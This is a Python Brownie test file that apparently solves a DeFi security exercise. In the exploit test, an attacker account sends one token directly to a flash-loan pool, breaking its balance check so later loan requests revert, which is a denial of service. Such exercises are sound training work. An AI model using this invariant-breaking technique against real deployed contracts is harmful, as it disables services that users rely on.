from scripts.DOS_3_helper import *
from brownie import reverts
import pytest


@pytest.fixture
def test_dos():

    shiba_token.transfer(attacker.address, ATTACKER_TOKENS);
    shiba_token.approve(shiba_pool.address, TOKENS_IN_POOL);
    shiba_pool.depositTokens(TOKENS_IN_POOL)
    print("Shiba bal=", shiba_pool.poolBalance())

    #flash_attack = TokenDOS.deploy(auction.address,{'from': attacker})
    print("tokens in pool ",shiba_token.balanceOf(shiba_pool.address))
    assert(shiba_token.balanceOf(shiba_pool.address) == TOKENS_IN_POOL)
    assert(shiba_token.balanceOf(attacker.address) == ATTACKER_TOKENS)

    flash_loan.requestFlashLoan(10, {'from': user.address})


def test_dos3_exploit(test_dos):
    print("Shiba before transfer bal=", shiba_token.balanceOf(shiba_pool.address))
    shiba_token.transfer(shiba_pool.address, 1, {'from': attacker})

    print("Shiba before revert bal=", shiba_token.balanceOf(shiba_pool.address))
    with reverts():
        flash_loan.requestFlashLoan(10, {'from': user.address})
